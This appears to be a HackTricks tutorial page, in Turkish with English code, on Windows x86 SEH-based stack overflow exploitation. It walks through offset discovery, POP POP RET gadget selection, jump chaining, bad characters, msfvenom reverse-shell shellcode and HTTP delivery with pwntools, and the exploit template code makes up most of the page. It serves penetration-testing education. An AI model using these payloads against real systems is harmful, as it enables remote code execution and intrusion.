# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based exploitation, stack'ta saklanan Structured Exception Handler zincirini suistimal eden klasik bir x86 Windows tekniğidir. Bir stack buffer overflow iki 4-byte alanı overwrite ettiğinde

- nSEH: sonraki SEH kaydına işaretçi, ve
- SEH: exception handler fonksiyonuna işaretçi

bir saldırgan yürütmeyi şu şekilde ele geçirebilir:

1) SEH'yi non-protected bir modüldeki POP POP RET gadget'inin adresine ayarlamak, böylece bir exception dispatch edildiğinde gadget saldırgan-kontrollü baytlara döner, ve
2) nSEH'yi kullanarak yürütmeyi (genellikle bir short jump) shellcode'un bulunduğu büyük taşan buffer'a geri yönlendirmek.

Bu teknik 32-bit süreçlere (x86) özgüdür. Modern sistemlerde gadget için SafeSEH ve ASLR olmayan bir modül tercih edin. Kötü karakterler genellikle C-strings ve HTTP parsing nedeniyle 0x00, 0x0a, 0x0d (NUL/CR/LF) gibi değerleri içerir.

---

## Tam offsetleri bulma (nSEH / SEH)

- Process'i çökertin ve SEH zincirinin overwrite edildiğini doğrulayın (ör., x32dbg/x64dbg'de SEH view'i kontrol edin).
- Taşan veri olarak bir cyclic pattern gönderin ve nSEH ile SEH'ye düşen iki dword'un offsetlerini hesaplayın.

Example with peda/GEF/pwntools on a 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Doğrulamak için bu pozisyonlara işaretleyiciler yerleştirin (ör. nSEH=b"BB", SEH=b"CC"). Çöküşün yeniden üretilebilir olması için toplam uzunluğu sabit tutun.

---

## POP POP RET (SEH gadget) seçimi

SEH çerçevesini açmak ve nSEH baytlarınıza dönmek için bir POP POP RET dizisine ihtiyacınız var. Bunu SafeSEH olmayan ve tercihen ASLR'siz bir modülde bulun:

- Mona (Immunity/WinDbg): `!mona modules` ardından `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` POP POP RET gadgets ve SafeSEH durumunu listelemek için.

Küçük-endian yazıldığında badchars içermeyen bir adres seçin (ör. `p32(0x004094D8)`). Koruma mekanizmaları izin veriyorsa gadget'ları vulnerable binary içinde tercih edin.

---

## Geri atlama tekniği (short + near jmp)

nSEH sadece 4 bayttır; bu en fazla 2 baytlık bir short jump (`EB xx`) artı dolguya sığar. Buffer başlangıcınıza ulaşmak için yüzlerce bayt geri atlamanız gerekiyorsa, nSEH'den hemen önce yerleştirilmiş 5 baytlık bir near jump kullanın ve nSEH'den yapılan short jump ile ona zincirleyin.

nasmshell ile:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
nSEH'nin offset 660'da olduğu 1000-byte payload için düzen fikri:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Çalışma akışı:
- İstisna oluşur, dispatcher üzerine yazılmış SEH'yi kullanır.
- POP POP RET, nSEH'imize geri sarılır.
- nSEH, 5 baytlık near jump içine `jmp short -8` çalıştırır.
- Near jump, buffer'ımızın başına iner; burası NOP sled + shellcode'un bulunduğu yerdir.

---

## Bad characters

Tam bir badchar dizisi oluşturun ve çökme sonrası stack belleğini karşılaştırarak hedef parser tarafından bozulmuş byte'ları çıkarın. HTTP tabanlı overflows için, `\x00\x0a\x0d` neredeyse her zaman hariç tutulur.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode generation (x86)

msfvenom'i badchars ile kullanın. Küçük bir NOP sled, iniş konumu sapmalarını tolere etmeye yardımcı olur.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
Eğer anında oluşturuluyorsa, hex formatı Python'da gömmek ve unhex yapmak için kullanışlıdır:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## HTTP üzerinden gönderme (kesin CRLF + Content-Length)

Zafiyet vektörü bir HTTP request body olduğunda, sunucunun taşan gövdenin tamamını okuması için kesin CRLFs ve Content-Length ile ham bir istek oluşturun.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Araçlar

- x32dbg/x64dbg ile SEH zincirini gözlemlemek ve çöküşü değerlendirmek.
- ERC.Xdbg (x64dbg eklentisi) ile SEH gadgets'larını listelemek: `ERC --SEH`.
- Alternatif olarak Mona: `!mona modules`, `!mona seh`.
- Kısa/near jump'ları assemble etmek ve ham opcode'ları kopyalamak için nasmshell.
- Hassas ağ payload'ları oluşturmak için pwntools.

---

## Notlar ve uyarılar

- Sadece x86 prosesleri için geçerlidir. x64 farklı bir SEH şeması kullanır ve SEH-based exploitation genellikle mümkün değildir.
- SafeSEH ve ASLR olmayan modüllerdeki gadgets'ları tercih edin; aksi takdirde, süreçte yüklü korumasız bir modül bulun.
- Çökme sonrası otomatik yeniden başlatma yapan service watchdog'ları, iterative exploit development'i kolaylaştırabilir.

## Referanslar
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
